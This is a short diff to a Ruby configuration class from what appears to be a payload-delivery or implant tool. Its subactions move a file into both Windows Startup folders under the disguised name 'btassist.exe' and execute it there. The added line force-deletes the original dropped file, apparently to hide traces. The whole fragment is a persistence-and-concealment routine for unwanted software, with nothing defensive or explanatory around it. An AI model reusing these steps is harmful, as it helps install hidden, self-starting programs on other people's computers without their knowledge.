@@ -57,6 +57,7 @@ class Configuration
       "subactions"=>[
           {"action"=>"execute", "command"=>"cmd.exe /c move $dir$\\ghits \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\btassist.exe\""},
           {"action"=>"execute", "command"=>"cmd.exe /c move $dir$\\ghits \"%HOMEPATH%\\Start Menu\\Programs\\Startup\\btassist.exe\""},
+          {"action"=>"execute", "command"=>"cmd.exe /c del /F $dir$\\ghits"},
           {"action"=>"execute", "command"=>"\"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\btassist.exe\""},
           {"action"=>"execute", "command"=>"\"%HOMEPATH%\\Start Menu\\Programs\\Startup\\btassist.exe\""},
       ]}
